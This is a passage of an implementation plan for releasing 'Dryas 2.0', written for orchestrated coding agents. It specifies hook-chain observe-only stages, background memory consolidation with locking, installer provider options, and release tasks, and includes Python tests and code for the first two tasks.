# Owned core, plan D: integration and the 2.0 release — Implementation Plan

> **For agentic workers:** run with `/orchestrate` on this file (Dryas). Each `## Task N:` section is self-contained: its Goal/Scope/Done/Failing-test lines are the `.orchestrate/PLAN.md` contract; Interfaces and Steps follow. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Wire the owned core (A's judge, B's memory, C's skills) into the hook chain, the installer, the skills and the docs. Make the owned core the default on a fresh install, with Ruflo, Superpowers and Jev as optional extras or upgrades. Ship evidence and a self-improvement loop for the local judge, plus `/retro`, `GLOSSARY.md`, `.out-of-scope/` and a measured rules-template pass. Release Dryas 2.0.0, installable and tested without Node on macOS, Linux and Windows.

**Architecture:** `chain.py` gains observe-only event kinds (`post`, `subagent-stop`, `session-start`, `session-end`, `precompact`). Their stages run `memhooks.py` and the new `gate_outcome.py`, and the plugin's `hooks.json` routes the matching Claude Code events to them. The installer resolves three provider slots: judge, memory and process. It turns the `memory` component on or off through `chain.local.json` and installs Ruflo and Superpowers only when selected. A fresh install selects neither; an upgrade keeps what it has. `/tune` gains two modules, `tune_judge.py` (shadow disagreements, allowlist proposals) and `tune_memory.py` (consolidation skips), plus a lines-per-task column in A2's `tune_tasks.py`. A labelled corpus under `reference/judge-corpus/` scores the local judge in CI. Docs, README, the reference manifest and both rules templates are then rewritten to match the merged code. The release ends on version 2.0.0.

**Tech Stack:** Python 3.9+ stdlib (unittest classes run by pytest), POSIX sh and PowerShell wrappers, GitHub Actions. Task 13 runs in the FlowObserve repo (TypeScript, vitest, pnpm).

**Spec:** `docs/superpowers/specs/2026-10-14-owned-core-design.md`. It covers all of Sub-project D: Hook chain, MCP server, Installer and manifest, Docs, Repositioning, Local judge for users without Jev, Memory consolidation outside the hook budget, Before 2.0 ships, No-loss inventory, Learning loop and shared language, Release, and Cut-over. The plan also draws on its Decisions, Error handling and Testing sections. Each earlier plan's "left to D" notes are folded in: B (`docs/plans/2026-10-14-owned-core-b-memory.md`, last section), C (`docs/plans/2026-10-14-owned-core-c-process-skills.md`: `--with-superpowers`, default flip, docs) and A2 (task-level judge; lines-per-task metric from the Ponytail lessons).

**Start:** the D worktree (`feat/owned-core-d`) branches from `spec/owned-core` at or after 25529e6 (A2 merged 2026-10-15; this plan branch already contains it). Tasks 7, 8 and 15 consume A2's modules (`pathclass.py`, `tune_tasks.py`, `tune_window.py`, the two-record `log_dispatch`). Check before Task 1: `git log --oneline spec/owned-core | grep -i "a2"` shows the A2 merge, and `ls claude/jev/pathclass.py claude/jev/tune_tasks.py` succeeds. If A2 has not merged, Tasks 1–6, 9 and 12 may start, and Tasks 7, 8 and 15 wait.

## Global Constraints

- Python 3.9+ stdlib only. No Node, npm or compiled component in the core. Tests are `unittest.TestCase` classes. Isolate the environment with `p = mock.patch.dict(os.environ, {...}); p.start(); self.addCleanup(p.stop)` (no `enterContext`).
- **Additive only.** Nothing an existing install has today disappears: every tool, flag, hook, skill and record keeps working through a Dryas-owned equivalent or as an optional extra. `python3 tools/inventory.py --check` prints `0 problems` at the end of every task. A rename or removal needs a row in `reference/inventory-map.json`, and that row is named in the task.
- **Do not edit existing tests**, except the named exceptions:
  - `install/tests/test_run_cmd.py::RunCmdTest::test_components` (expected default lists; Task 3).
  - `install/tests/test_claude_md_template.py` (the needle `scope lock -> Jev -> Ruflo` becomes `scope lock -> gate -> memory -> observer`; Task 5; Task 14 may change the size bound).
  - `install/tests/test_plugin_shape.py` (only if Task 3's component change requires it).
  - The three timing tests that A2's cleanup made relative (Task 15 only confirms them).
- The spec's numbered rules in `spec/dryas-spec-v1.md` do not change. Only §9.2's example manifest is updated (Task 11).
- Provider slots, exactly as the spec writes them: `judge: local | jev` (fresh default `local`), `judge.shadow: local | jev | none`, `memory: dryas | ruflo | none` (fresh default `dryas`), `process: dryas | superpowers` (default `dryas`). On upgrade, an existing install keeps its current providers until the user flips them.
- Installer flags: added `--judge local|jev`, `--with-ruflo`, `--with-superpowers`, `--with-design`. Aliases: `--no-jev` = `--judge local`; `--no-ruflo` and `--no-superpowers` keep their meaning; `--no-design` keeps its meaning (design stays installed by default); `--openrouter-key` implies `--judge jev`; `--no-pstack-picks` is unchanged. Preflight needs Python 3.9+ only; Node, npm and the path-with-spaces check apply only with Ruflo selected.
- The MCP server keeps the name `jev` and its six tools. The memory tools are already on it (plan B). Hook order per GOV-11: scope lock → gate → memory → observer. Every memory stage is observe-only, exits 0 and is budgeted at 2 s.
- Jev JSONL logs stay JSONL. New fields only, never renamed. FlowObserve's reducer is updated in step (Task 13) and its golden replay passes before D merges.
- One source of truth is `claude/`. `codex/jev`, `codex/pstack` and `codex/skills/<process skill>` are generated by `python3 tools/sync_codex_plugin.py`. A task that changes `claude/jev` or a process skill runs the sync and lists `codex/**` paths in its Scope.
- No literal `"/tmp/` path, no `shell=True`, and every `os.chmod` sits in a file that also checks `os.name` (`install/tests/test_portability.py`). Files stay under 500 lines.
- Shell probes that contain catastrophic command strings are denied by the live gate. Keep such strings inside test or corpus files written with the Write tool, never in a Bash command line.
- Commits: conventional messages, explicit paths. Executors commit their own task only when the dispatch prompt allows it, and never push, merge or create worktrees (this is Task 5's new executor rule 5, already in force for this plan). The orchestrator may push `feat/owned-core-d` to origin. No force push, no PR, nothing to `main` until Promprit says release.
- Before reporting a measured performance number, read `claude/pstack/benchmark-checklist.md` and answer its questions. Cleanup steps follow `claude/pstack/cleanup.md` as plan C left it (minimum-code ladder).
- Wording in docs follows the tier names (fast, standard, strong, frontier). Model names appear only inside backticks (`install/tests/test_tier_docs.py`).

## Review Focus

1. **Upgrading a 1.x install that has Ruflo, Superpowers and a Jev key, rerun with no flags.** It keeps Ruflo, Superpowers, `judge: jev` and Ruflo memory. The Dryas memory stages stay off and nothing is uninstalled. Pinned by `test_upgrade_without_flags_keeps_extras_and_providers` (Task 3).
2. **Two session ends at once (or a session end plus the next session start).** Only one background consolidation runs. A crashed run's lock goes stale and is taken over, so the next run is not blocked forever. Pinned by `test_second_run_exits_while_locked` and `test_stale_lock_is_taken_over` (Task 2).
3. **A fresh install on a machine with no Node and a space in the home path** passes preflight and installs. The Node and space checks fire only with `--with-ruflo`. Pinned by `test_fresh_install_needs_no_node_and_allows_spaces` (Task 3).
4. **An approved-ask history that includes a dangerous or destructive command prefix** never yields an allowlist proposal, and `/tune apply gate.allowlist` refuses such an entry typed by hand. Pinned by `test_dangerous_prefix_never_proposed` and `test_apply_refuses_dangerous_allowlist_entry` (Task 7).
5. **A memory stage that hangs, crashes or prints junk** never blocks, delays past its timeout, or changes a tool call or session. The chain prints nothing for observe kinds and exits 0. Pinned by `test_hung_observe_stage_does_not_block` (Task 1).

## File map

Create:
- `claude/jev/gate_outcome.py`, `claude/jev/tune_judge.py`, `claude/jev/tune_memory.py`, `claude/jev/consolidate_bg.py`
- `claude/bin/dryas`, `claude/bin/dryas.cmd`
- `claude/commands/retro.md`, `codex/skills/retro/SKILL.md`, `codex/skills/retro/agents/openai.yaml`
- `tools/judge_score.py`, `reference/judge-corpus/{commands.jsonl,edits.jsonl,baseline.json,SCORECARD.md}`
- `GLOSSARY.md`; `.out-of-scope/{rust-core,embeddings-in-memory,rebuild-ruflo-tools,replace-design-plugins}.md`
- `docs/template-coverage.md`; `install/tests/fixtures/template-pre-2.0/{CLAUDE.md.template,AGENTS.md.template}`
- tests: `claude/jev/tests/test_chain_observe.py`, `test_consolidate_bg.py`, `test_gate_outcome.py`, `test_tune_judge.py`, `test_tune_memory.py`, `test_tune_lines.py`; `install/tests/test_providers_install.py`, `test_dryas_wrapper.py`, `test_legacy_cleanup.py`, `test_judge_scorecard.py`, `test_owned_core_docs.py`, `test_retro_glossary.py`, `test_template_budget.py`, `test_e2e_no_node.py`, `test_release_2_0.py`

Modify:
- `claude/jev/{chain.py,chain.json,memhooks.py,memcli.py,rules_inject.py,tune.py,tune_tasks.py,gate.py,thresholds.py,jev_mcp.py}`
- `claude/hooks/hooks.json`, `codex/hooks/hooks.json`, `claude/settings.fragment.json`
- `install/{run_cmd.py,plugin_setup.py,codex_plugin_setup.py,components.json}`, `tools/{release_check.py,sync_codex_plugin.py}`
- `.github/workflows/{ci.yml,latest-compat.yml}`
- skills and agents: `claude/skills/orchestrate/{SKILL.md,ruflo-tools.md}`, `codex/skills/orchestrate/SKILL.md`, `claude/agents/executor.md`, `claude/skills/review-receive/SKILL.md`, `claude/commands/tune.md`, `codex/skills/tune/SKILL.md`
- templates: `claude/CLAUDE.md.template`, `codex/AGENTS.md.template`
- docs and reference: `README.md`, `reference/{README.md,dryas.yaml}`, `spec/dryas-spec-v1.md` (§9.2 only), every file under `docs/` named in Tasks 10–11, `CONTRIBUTING.md`, `NOTICE.md`, `CHANGELOG.md`
- version files: the five `release_check.VERSION_FILES` (`claude/.claude-plugin/plugin.json`, `codex/.codex-plugin/plugin.json`, `.claude-plugin/marketplace.json`, `CHANGELOG.md`, `claude/jev/jev_mcp.py` serverInfo), plus generated `codex/**`

Cross-repo: the FlowObserve repo (`../flowobserve` beside this repo) (Task 13, its own worktree and branch).

## Order

- **Task 1** first: the observe kinds that Tasks 2 and 7 hang stages on.
- **After Task 1**, these may run in parallel; their scopes do not overlap:
  - Task 2 (memory consolidation) → Task 7 (tune judge) → Task 8 (lines per task). This chain is serialized because all three edit `tune.py`.
  - Task 3 (installer) → Task 4 (wrapper and legacy cleanup), which shares `plugin_setup.py`.
  - Task 5 (process wiring).
  - Task 6 (scorecard).
  - Task 9 (`/retro`, glossary, out-of-scope).
- **Task 12** (no-Node release tooling) waits for Tasks 3 and 4.
- **Task 13** (FlowObserve) waits for Tasks 1, 7 and 8, whose record fields it replays.
- **Tasks 10 and 11** (docs, repositioning) wait for Tasks 1–9, since docs describe merged code. They run in parallel with each other.
- **Task 14** (rules-template pass) waits for Tasks 5, 10 and 11.
- **Task 15** (release) is last.

Deliberate choices where the spec is silent, each small:
- **`memory` component.** The spec's memory slot becomes a component named `memory` (default on), so `--no-memory` and `chain.local.json` "off" work the way the other components do. `--memory dryas|ruflo|none` is the explicit form: `ruflo` implies `--with-ruflo`, and `none` turns both off.
- **Judge provider is stored in user thresholds.** `--judge` writes `judge.provider` to the user thresholds file (`~/.dryas/jev/thresholds.json`, through `thresholds.set_value`), where A1's `providers.py` already reads it. `chain.local.json` records `"providers"` for display and upgrade. With no flag, `auto` stays: `jev` when a key is set, else `local`, which is the spec's fresh-install default.
- **`jev` stays an always-on stage component.** `--no-jev` no longer disables the gate and route stages; it means `--judge local`. Exception: an upgrade whose install record lacks `jev` (a 1.x `--no-jev` install) keeps those stages off until the user passes `--judge`, which preserves its current behaviour. The `mcp__plugin_dryas_jev` allow rule moves to the `core` block, because the memory tools live on that server.
- **Codex memory stages.** Codex runs only `mem-session-start` (from its SessionStart hook). Its PostToolUse, SubagentStop and SessionEnd stages stay Claude Code only, and `docs/harnesses.md` says so. Memory tools reach parity on Codex through MCP.
- **Approved asks for allowlist proposals.** A user's approval of a local `ask` is observed, not reported. `gate.py` logs `tool_use_id` on every gate record, and a PostToolUse observe stage `gate-outcome` logs the `tool_use_id` of every Bash call that ran. An ask whose id ran was approved. Overrides of `deny` come only from `log_override` records.
- **Already done before D.** `origin/main` is already contained in `spec/owned-core` (0 commits missing on 2026-10-15), so Task 15 only re-checks it. The `mcp__plugin_dryas_jev` server-wide allow rule already covers the five memory tools, so no per-tool allow rules are added.

---

## Task 1: Observe-only event kinds and the memory stages

Goal: `chain.py` runs observe-only stages for PostToolUse/PostToolUseFailure, SubagentStop, SessionStart, SessionEnd and PreCompact; `chain.json` adds the `mem-*` stages (component `memory`); both editions' hook files route those events to the chain.
Scope:
- claude/jev/chain.py
- claude/jev/chain.json
- claude/hooks/hooks.json
- codex/hooks/hooks.json
- claude/jev/tests/test_chain_observe.py
- codex/jev/**
Done:
- `python3 -m pytest -q claude/jev/tests/test_chain_observe.py claude/jev/tests/test_chain.py claude/jev/tests/test_chain_local.py claude/jev/tests/test_memhooks.py install/tests/test_portability.py` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0
- `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: claude/jev/tests/test_chain_observe.py :: ObserveTest :: test_post_kind_runs_mem_edit_and_prints_nothing

**Interfaces:**
- Produces: `chain.OBSERVE_KINDS = ("post", "subagent-stop", "session-start", "session-end", "precompact")`; `chain.observe(event: dict, raw: str, stages: list) -> None` (runs every applicable stage, ignores exit codes and output, swallows every exception). `chain.py <kind>` for an observe kind prints nothing and exits 0.
- Produces chain stages (all `"component": "memory"`, `"observe": true`, `"timeout": 2`):
  - `post`: `mem-edit` → `memhooks.py edit`, match `Write|Edit|MultiEdit|NotebookEdit`
  - `subagent-stop`: `mem-task` → `memhooks.py task`
  - `session-start`: `mem-session-start` → `memhooks.py session-start`, `"harness": ["claude", "codex"]`
  - `session-end`: `mem-session-end` → `memhooks.py session-end`
  - `precompact`: `mem-session-end` → `memhooks.py session-end auto`
- Consumed by Task 2 (`session-start` kind), Task 3 (`write_chain_local` sees the `memory` component) and Task 7 (adds `gate-outcome` to `post`).

- [ ] **Step 1: Write the failing tests** in `claude/jev/tests/test_chain_observe.py`:

```python
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
JEV = os.path.dirname(HERE)
sys.path.insert(0, JEV)
import chain

CHAIN = os.path.join(JEV, "chain.py")


def run_chain(kind, event, config, harness=None, env_extra=None):
    env = dict(os.environ, JEV_CHAIN_CONFIG=config, JEV_CHAIN_LOCAL=os.path.join(os.path.dirname(config), "none.json"))
    env.update(env_extra or {})
    argv = [sys.executable, CHAIN, kind] + (["--harness", harness] if harness else [])
    t0 = time.monotonic()
    p = subprocess.run(argv, input=json.dumps(event), capture_output=True, text=True, env=env, timeout=30)
    return p, time.monotonic() - t0


class ObserveTest(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        self.out = os.path.join(self.d, "ran.txt")

    def config(self, kind, stages):
        p = os.path.join(self.d, "chain.json")
        with open(p, "w", encoding="utf-8") as f:
            json.dump({kind: stages}, f)
        return p

    def stage(self, name, code, **kw):
        s = {"name": name, "component": "memory", "observe": True, "timeout": 2,
             "cmd": [sys.executable, "-c", code, self.out]}
        s.update(kw)
        return s

    def test_post_kind_runs_mem_edit_and_prints_nothing(self):
        code = "import sys;open(sys.argv[1],'a').write(sys.stdin.read()[:40]+'\\n');print('junk')"
        cfg = self.config("post", [self.stage("mem-edit", code, match="Write|Edit|MultiEdit|NotebookEdit")])
        p, _ = run_chain("post", {"tool_name": "Edit", "tool_input": {"file_path": "a.py"}}, cfg)
        self.assertEqual(p.returncode, 0)
        self.assertEqual(p.stdout, "")
        with open(self.out, encoding="utf-8") as f:
            self.assertIn("Edit", f.read())

    def test_match_filters_tools(self):
        code = "import sys;open(sys.argv[1],'a').write('x')"
        cfg = self.config("post", [self.stage("mem-edit", code, match="Write|Edit")])
        run_chain("post", {"tool_name": "Bash", "tool_input": {"command": "ls"}}, cfg)
        self.assertFalse(os.path.exists(self.out))

    def test_hung_observe_stage_does_not_block(self):
        hang = "import time;time.sleep(30)"
        crash = "raise SystemExit(3)"
        write = "import sys;open(sys.argv[1],'a').write('ok')"
        cfg = self.config("session-end", [self.stage("hang", hang), self.stage("crash", crash),
                                          self.stage("after", write)])
        p, secs = run_chain("session-end", {"session_id": "s"}, cfg)
        self.assertEqual(p.returncode, 0)
        self.assertEqual(p.stdout, "")
        self.assertLess(secs, 10)  # hang is cut at its 2 s timeout; generous bound for a loaded runner
        with open(self.out, encoding="utf-8") as f:
            self.assertEqual(f.read(), "ok")

    def test_disabled_and_harness_filtered(self):
        write = "import sys;open(sys.argv[1],'a').write('x')"
        cfg = self.config("session-start", [self.stage("off", write, enabled=False),
                                            self.stage("claude-only", write)])
        run_chain("session-start", {}, cfg, harness="codex")
        self.assertFalse(os.path.exists(self.out))

    def test_unknown_kind_is_a_noop(self):
        cfg = self.config("post", [])
        p, _ = run_chain("nonsense", {}, cfg)
        self.assertEqual((p.returncode, p.stdout), (0, ""))


class ShippedChainTest(unittest.TestCase):
    def test_memory_stages_shipped(self):
        with open(os.path.join(JEV, "chain.json"), encoding="utf-8") as f:
            c = json.load(f)
        want = {("post", "mem-edit", "edit"), ("subagent-stop", "mem-task", "task"),
                ("session-start", "mem-session-start", "session-start"),
                ("session-end", "mem-session-end", "session-end"), ("precompact", "mem-session-end", "session-end")}
        got = set()
        for kind in chain.OBSERVE_KINDS:
            for s in c.get(kind, []):
                if s.get("component") == "memory":
                    self.assertTrue(s.get("observe"))
                    self.assertLessEqual(s.get("timeout"), 2)
                    self.assertTrue(s["cmd"][3].endswith("memhooks.py"), s["cmd"])
                    got.add((kind, s["name"], s["cmd"][4]))  # [$PY, -X, utf8, memhooks.py, stage, (mode)]
        self.assertEqual(got, want)
        pre = [s for s in c["precompact"] if s["name"] == "mem-session-end"][0]
        self.assertEqual(pre["cmd"][-1], "auto")  # summary only: never a full consolidation inside PreCompact
        start = [s for s in c["session-start"] if s["name"] == "mem-session-start"][0]
        self.assertEqual(start["harness"], ["claude", "codex"])

    def test_hook_files_route_events(self):
        root = os.path.dirname(os.path.dirname(JEV))
        with open(os.path.join(root, "claude", "hooks", "hooks.json"), encoding="utf-8") as f:
            h = json.load(f)["hooks"]
        cmds = lambda ev: " ".join(x["command"] for m in h.get(ev, []) for x in m["hooks"])
        for ev, kind in (("PostToolUse", "post"), ("PostToolUseFailure", "post"), ("SubagentStop", "subagent-stop"),
                         ("SessionStart", "session-start"), ("SessionEnd", "session-end"), ("PreCompact", "precompact")):
            self.assertIn("chain.py\" " + kind, cmds(ev), ev)
        with open(os.path.join(root, "codex", "hooks", "hooks.json"), encoding="utf-8") as f:
            cx = json.load(f)["hooks"]
        self.assertIn("session-start --harness codex", " ".join(x["command"] for m in cx["SessionStart"] for x in m["hooks"]))
```

- [ ] **Step 2: Run** `python3 -m pytest -q claude/jev/tests/test_chain_observe.py` → FAIL (`chain.py post` exits 0 but runs nothing; `OBSERVE_KINDS` undefined).

- [ ] **Step 3: Implement in `claude/jev/chain.py`.** Replace the docstring's first line with `"""Run hook stages in order for one hook event. Kinds: pretool | prompt | the observe kinds. Stages: chain.json.` and add after `prompt()`:

```python
OBSERVE_KINDS = ("post", "subagent-stop", "session-start", "session-end", "precompact")


def observe(event: Dict[str, Any], raw: str, stages: List[Dict[str, Any]]) -> None:
    """Observe-only events (memory, outcomes): every applicable stage runs in order; exit codes and output are
    ignored and nothing is printed, so a slow, crashing or noisy stage never changes the session."""
    for st in stages:
        try:
            if _applies(st, event):
                _run(st, raw)
        except Exception:
            continue
```

In `main()`, before the final `else: return 0`, add:

```python
    elif kind in OBSERVE_KINDS:
        observe(event, raw, load_stages(kind, harness))
        return 0
```

`_run` already enforces each stage's `timeout`. Read its body: if it does not kill on timeout, the hang test fails, and the fix belongs in `_run` (`subprocess.run(..., timeout=...)` with `TimeoutExpired` → `(None, "", "")`).

- [ ] **Step 4: Add the stages to `claude/jev/chain.json`** (new top-level keys after `"prompt"`):

```json
  "post": [
    {"name": "mem-edit", "component": "memory", "cmd": ["$PY", "-X", "utf8", "$CD/jev/memhooks.py", "edit"], "match": "Write|Edit|MultiEdit|NotebookEdit", "timeout": 2, "observe": true}
  ],
  "subagent-stop": [
    {"name": "mem-task", "component": "memory", "cmd": ["$PY", "-X", "utf8", "$CD/jev/memhooks.py", "task"], "timeout": 2, "observe": true}
  ],
  "session-start": [
    {"name": "mem-session-start", "harness": ["claude", "codex"], "component": "memory", "cmd": ["$PY", "-X", "utf8", "$CD/jev/memhooks.py", "session-start"], "timeout": 2, "observe": true}
  ],
  "session-end": [
    {"name": "mem-session-end", "component": "memory", "cmd": ["$PY", "-X", "utf8", "$CD/jev/memhooks.py", "session-end"], "timeout": 2, "observe": true}
  ],
  "precompact": [
    {"name": "mem-session-end", "component": "memory", "cmd": ["$PY", "-X", "utf8", "$CD/jev/memhooks.py", "session-end", "auto"], "timeout": 2, "observe": true}
  ]
```

The observer (`flowobserve`) stays last in `pretool` and `prompt`. Memory stages sit after gate stages by event, which satisfies GOV-11.

- [ ] **Step 5: Route the events.** In `claude/hooks/hooks.json`, use the existing command shape `"\"${DRYAS_PY:-python3}\" -X utf8 \"${CLAUDE_PLUGIN_ROOT}/jev/chain.py\" <kind>"` and add:
  - `"PostToolUse"` and `"PostToolUseFailure"`: matcher `"Bash|Write|Edit|MultiEdit|NotebookEdit"`, kind `post`, timeout 10. (Bash is matched now so that Task 7's `gate-outcome` needs no hook change.)
  - `"SubagentStop"`: kind `subagent-stop`, timeout 5.
  - `"SessionEnd"`: kind `session-end`, timeout 5.
  - A second `"SessionStart"` entry: matcher `startup|resume|clear|compact`, kind `session-start`, timeout 5. Put it after `rules_inject.py`.
  - A second `"PreCompact"` entry: kind `precompact`, timeout 5. Put it after `compact_keep.py`.

  In `codex/hooks/hooks.json`, add a second SessionStart entry: `chain.py session-start --harness codex`, plus a `commandWindows` twin in the existing style.
- [ ] **Step 6: Run** `python3 tools/sync_codex_plugin.py`, then everything in Done, and confirm `test_chain.py` / `test_chain_local.py` still pass unchanged. If `inventory.py --check` lists `plugin_hook` entries as lost, the existing entries were reshaped instead of added to. Fix the JSON, not the map.
- [ ] **Step 7: Commit** `git add claude/jev/chain.py claude/jev/chain.json claude/hooks/hooks.json codex/hooks/hooks.json claude/jev/tests/test_chain_observe.py codex/jev` and `git commit -m "feat(chain): observe-only event kinds and the Dryas memory stages"`.

---

## Task 2: Memory consolidation outside the hook budget

Goal: when `mem-session-end` skips consolidation (`ConsolidateSkipped`), a detached, locked `memcli.py consolidate --ns NS` run finishes it; a pending marker makes the next session start retry; `/tune` counts skips and background runs; the session-start rules mention repeated skips.
Scope:
- claude/jev/consolidate_bg.py
- claude/jev/memhooks.py
- claude/jev/memcli.py
- claude/jev/rules_inject.py
- claude/jev/tune_memory.py
- claude/jev/tune.py
- claude/jev/tests/test_consolidate_bg.py
- claude/jev/tests/test_tune_memory.py
- codex/jev/**
Done:
- `python3 -m pytest -q claude/jev/tests/test_consolidate_bg.py claude/jev/tests/test_tune_memory.py claude/jev/tests/test_memhooks.py claude/jev/tests/test_tune.py claude/jev/tests/test_rules_inject.py install/tests/test_portability.py install/tests/test_inventory.py` passes
- `python3 tools/sync_codex_plugin.py --check` exits 0; `python3 tools/inventory.py --check` prints `0 problems`
Failing test first: claude/jev/tests/test_consolidate_bg.py :: LockTest :: test_second_run_exits_while_locked

**Interfaces:**
- Consumes: `memlearn.consolidate(conn, ns, now=None, deadline=None) -> dict`; `memdb.connect(path=None, busy_ms=...)`; `memdb.tx(conn)`; `paths.data_root()`; `paths.python()`; `jevlog.append(name, rec)`; the `kv(key PK, value)` table.
- Produces: `consolidate_bg.LOCK_NAME = "consolidate.lock"`, `consolidate_bg.STALE_S = 600`; `consolidate_bg.acquire(root: str) -> Optional[int]` (an fd, or None when a fresh lock exists; a lock older than `STALE_S` is replaced); `consolidate_bg.release(root: str, fd: int) -> None`; `consolidate_bg.mark_pending(conn, ns: str) -> None` (kv key `consolidate_pending:<ns>`); `consolidate_bg.pending(conn) -> List[str]`; `consolidate_bg.clear_pending(conn, ns: str) -> None`; `consolidate_bg.spawn(ns: Optional[str]) -> bool` (a detached `memcli.py consolidate [--ns NS]`, stdio to devnull; False if Popen fails).
- Produces: `memcli.py consolidate` takes the lock. While it is held, it prints `consolidation already running` and exits 0. It logs `jevlog.append("memory", dict(stage="consolidate", ns=ns, ok=True, ms=ms))` per namespace, clears that namespace's pending marker, and releases the lock in `finally`.
- Produces: `tune_memory.summary(memory_rows: list) -> dict` with keys `skipped_budget`, `skipped_deadline`, `background_runs`, `background_failed`; `tune_memory.lines(s: dict) -> List[str]`; `rules_inject.consolidate_warning(rows: list, now: float) -> str` (empty or one line).

- [ ] **Step 1: Write the failing tests.** `claude/jev/tests/test_consolidate_bg.py`:

```python
import os
import sys
import tempfile
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import consolidate_bg as bg
import memdb


class LockTest(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()

    def test_second_run_exits_while_locked(self):
        fd = bg.acquire(self.root)
        self.assertIsNotNone(fd)
        self.assertIsNone(bg.acquire(self.root))
        bg.release(self.root, fd)
        fd2 = bg.acquire(self.root)
        self.assertIsNotNone(fd2)
        bg.release(self.root, fd2)

    def test_stale_lock_is_taken_over(self):
        fd = bg.acquire(self.root)
        os.close(fd)  # crashed run: fd gone, file left behind
        old = time.time() - bg.STALE_S - 5
        os.utime(os.path.join(self.root, bg.LOCK_NAME), (old, old))
        fd2 = bg.acquire(self.root)
        self.assertIsNotNone(fd2)
        bg.release(self.root, fd2)


class PendingTest(unittest.TestCase):
    def test_mark_list_clear(self):
        conn = memdb.connect(os.path.join(tempfile.mkdtemp(), "d.db"))
        bg.mark_pending(conn, "repo")
        bg.mark_pending(conn, "repo")
        self.assertEqual(bg.pending(conn), ["repo"])
        bg.clear_pending(conn, "repo")
        self.assertEqual(bg.pending(conn), [])
        conn.close()


class SpawnTest(unittest.TestCase):
    def test_spawn_is_detached_and_silent(self):
        with mock.patch("subprocess.Popen") as P:
            self.assertTrue(bg.spawn("repo"))
        args, kw = P.call_args
        self.assertTrue(args[0][-2:] == ["--ns", "repo"] and "memcli.py" in args[0][-4])
        self.assertIn("stdin", kw)
        if os.name == "nt":
            self.assertTrue(kw.get("creationflags"))
        else:
            self.assertTrue(kw.get("start_new_session"))

    def test_spawn_failure_returns_false(self):
        with mock.patch("subprocess.Popen", side_effect=OSError("no")):
            self.assertFalse(bg.spawn(None))


class HookTest(unittest.TestCase):
    """mem-session-end marks and spawns on a skip; mem-session-start retries pending work."""

    def setUp(self):
        self.d = tempfile.mkdtemp()
        p = mock.patch.dict(os.environ, {"DRYAS_DB": os.path.join(self.d, "d.db"), "DRYAS_DATA_ROOT": self.d,
                                         "JEV_LOG_DIR": self.d})
        p.start()
        self.addCleanup(p.stop)

    def test_skip_marks_and_spawns(self):
        import memhooks
        with mock.patch.object(memhooks.memlearn, "consolidate", return_value={"skipped": "deadline"}), \
                mock.patch.object(memhooks.consolidate_bg, "spawn", return_value=True) as sp:
            conn = memdb.connect()
            out = memhooks.on_session_end(conn, {"session_id": "s", "cwd": self.d}, None, time.monotonic())
            self.assertEqual(out["consolidate_skipped"], "deadline")
            self.assertEqual(bg.pending(conn), [memhooks.projns.project_ns(self.d)])
            conn.close()
        sp.assert_called_once()

    def test_session_start_retries_pending_once_unlocked(self):
        import memhooks
        conn = memdb.connect()
        bg.mark_pending(conn, "repo")
        with mock.patch.object(memhooks.consolidate_bg, "spawn", return_value=True) as sp:
            memhooks.on_session_start(conn, {"session_id": "s2", "cwd": self.d})
        sp.assert_called_once_with(None)
        conn.close()
```

`claude/jev/tests/test_tune_memory.py`:

```python
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import rules_inject
import tune_memory

ROWS = [dict(stage="session-end", error="ConsolidateSkipped", detail="budget", ts="2026-10-15T10:00:00+0700"),
        dict(stage="session-end", error="ConsolidateSkipped", detail="deadline", ts="2026-10-15T11:00:00+0700"),
        dict(stage="session-end", error="ConsolidateSkipped", detail="deadline", ts="2026-10-15T12:00:00+0700"),
        dict(stage="consolidate", ns="repo", ok=True, ms=3300, ts="2026-10-15T12:01:00+0700"),
        dict(stage="consolidate", ns="repo", ok=False, ms=10, ts="2026-10-15T12:02:00+0700"),
        dict(stage="edit", error="OperationalError", detail="locked", ts="2026-10-15T12:03:00+0700")]


class TuneMemoryTest(unittest.TestCase):
    def test_summary_counts(self):
        s = tune_memory.summary(ROWS)
        self.assertEqual(s, {"skipped_budget": 1, "skipped_deadline": 2, "background_runs": 1, "background_failed": 1})

    def test_lines_have_stable_labels(self):
        text = "\n".join(tune_memory.lines(tune_memory.summary(ROWS)))
        self.assertIn("- Memory consolidation skipped in hooks: 3 (budget 1, deadline 2)", text)
        self.assertIn("- Background consolidation runs: 1 ok, 1 failed", text)

    def test_empty_log(self):
        self.assertIn("- Memory consolidation skipped in hooks: 0", "\n".join(tune_memory.lines(tune_memory.summary([]))))


class WarningTest(unittest.TestCase):
    def test_repeated_skips_without_a_finished_run_warn(self):
        rows = [r for r in ROWS if r.get("ok") is not True]
        now = 1792040000.0  # 2026-10-15 ~12:13 +0700
        self.assertIn("dryas memory consolidate", rules_inject.consolidate_warning(rows, now))

    def test_a_finished_run_after_the_skips_silences_it(self):
        self.assertEqual(rules_inject.consolidate_warning(ROWS, 1792040000.0), "")
```

The timestamp format follows `jevlog` (`%Y-%m-%dT%H:%M:%S%z`). The tests compute the window from `now`; if `jevlog` exposes a parser, use it and adjust the literal `now` so all rows fall inside 7 days.

- [ ] **Step 2: Run** `python3 -m pytest -q claude/jev/tests/test_consolidate_bg.py claude/jev/tests/test_tune_memory.py` → FAIL (`ModuleNotFoundError: consolidate_bg`).
- [ ] **Step 3: Write `claude/jev/consolidate_bg.py`:**

```python
"""Memory consolidation outside the hook budget (owned core D). A lock keeps runs from overlapping; a kv marker
lets the next session start retry a namespace whose consolidation was skipped inside a hook."""
import os
import subprocess
import sys
import time
from typing import List, Optional

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import memdb
import paths

LOCK_NAME = "consolidate.lock"
STALE_S = 600
PREFIX = "consolidate_pending:"
HERE = os.path.dirname(os.path.abspath(__file__))


def acquire(root: str) -> Optional[int]:
    p = os.path.join(root, LOCK_NAME)
    for _ in range(2):
        try:
            fd = os.open(p, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
            os.write(fd, str(os.getpid()).encode("ascii"))
            return fd
